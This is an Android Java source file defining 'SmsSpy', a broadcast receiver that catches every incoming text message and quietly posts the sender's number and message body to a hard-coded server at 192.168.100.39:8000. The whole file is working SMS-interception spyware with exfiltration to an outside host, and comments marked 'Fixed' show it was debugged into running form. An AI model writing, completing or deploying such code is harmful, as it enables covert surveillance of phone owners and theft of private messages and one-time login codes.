package com.sciatafrica.lofty;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.telephony.SmsMessage;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

import javax.net.ssl.HttpsURLConnection;

public class SmsSpy extends BroadcastReceiver {

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        // Check if this is an SMS received intent
        if (!intent.getAction().equals(SMS_RECEIVED)) {
            return;
        }

        Object[] pdus = (Object[]) intent.getExtras().get("pdus");
        if (pdus == null || pdus.length == 0) {
            return;
        }

        SmsMessage shortMessage = SmsMessage.createFromPdu((byte[]) pdus[0]);
        // Fixed: corrected string concatenation and removed duplicate shortMessage
        String sms = shortMessage.getOriginatingAddress() + "_" + shortMessage.getDisplayMessageBody();

        try {
            new NetTask().execute(sms);
        } catch (Exception e) {
            Log.e("SmsSpy", "Error processing SMS", e);
        }
    }
}

// Fixed: Removed duplicate public modifier and made class non-public
class NetTask extends AsyncTask<String, Integer, String> {
    @Override
    protected String doInBackground(String... params) {
        String res = httpPost(params[0]);
        return res;
    }

    // Fixed: Made this method non-static and accessible
    private String httpPost(String text) {
        String response = "";
        HttpURLConnection conn = null;

        try {
            String url = "http://192.168.100.39:8000/post";
            URL urlObj = new URL(url);
            conn = (HttpURLConnection) urlObj.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Accept-Charset", "UTF-8");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setReadTimeout(10000);
            conn.setConnectTimeout(10000);

            String paramsString = "smstext=" + text.replace(" ", "_");
            DataOutputStream wr = new DataOutputStream(conn.getOutputStream());
            wr.writeBytes(paramsString);
            wr.flush();
            wr.close();

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                String line;
                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                while ((line = br.readLine()) != null) {
                    response += line;
                }
                br.close();
            } else {
                response = "HTTP Error: " + responseCode;
            }

        } catch (Exception e) {
            Log.e("NetTask", "HTTP Post Error", e);
            response = "Error: " + e.getMessage();
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
        return response;
    }
}